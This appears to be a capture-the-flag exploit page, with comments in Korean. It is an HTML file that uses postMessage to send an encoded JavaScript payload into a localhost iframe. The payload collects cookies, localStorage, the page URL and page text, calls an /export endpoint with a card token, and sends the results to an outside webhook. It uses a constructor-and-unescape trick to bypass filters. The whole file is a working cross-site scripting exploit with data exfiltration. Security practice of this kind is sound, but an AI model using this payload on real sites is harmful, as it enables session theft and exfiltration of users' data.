<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>CTF Unified Exploit</title>
</head>
<body>
    <script>
        // 1. 웹훅 URL 설정 (여기를 본인 주소로 수정하세요)
        const W = "https://kghpomc.request.dreamhack.games"; 

        // 2. 디버깅 및 플래그 탈취 페이로드
        // 봇의 환경을 덤프하고 웹훅으로 쏴주는 디버깅 로직 포함
        const DEBUG_PAYLOAD = `
            const debug = {
                cookies: document.cookie,
                location: location.href,
                localStorage: JSON.stringify(localStorage),
                bodyPreview: document.body.innerText.substring(0, 500)
            };
            
            try {
                // 팀원의 페이로드 구조 (fetch를 이용한 export 호출)
                fetch("/export", {
                    method: "POST",
                    headers: { "X-Card-Token": CARD_TOKEN, "Content-Type": "application/javascript" },
                    body: "1"
                })
                .then(r => r.text())
                .then(data => {
                    debug.exportedData = data;
                    fetch("${W}?data=" + encodeURIComponent(JSON.stringify(debug)));
                });
            } catch(e) {
                debug.error = e.message;
                fetch("${W}?error=" + encodeURIComponent(JSON.stringify(debug)));
            }
        `;

        // 3. 인코딩하여 필터링 우회
        const PAYLOAD = '[]["fill"]["con"+"structor"](unescape("' + escape(DEBUG_PAYLOAD) + '"))()';

        // 4. 봇 공격 환경 구성
        window.onload = () => {
            const iframe = document.getElementById("preview");
            // 로딩 대기 후 메시지 전송
            setTimeout(() => {
                try {
                    iframe.contentWindow.postMessage(PAYLOAD, "*");
                } catch (e) {
                    new Image().src = W + "?pm_error=" + encodeURIComponent(e.message);
                }
            }, 1000);
        };
    </script>

    <iframe id="preview" src="http://localhost:5000/preview" style="width:100%; height:500px;"></iframe>
</body>
</html>
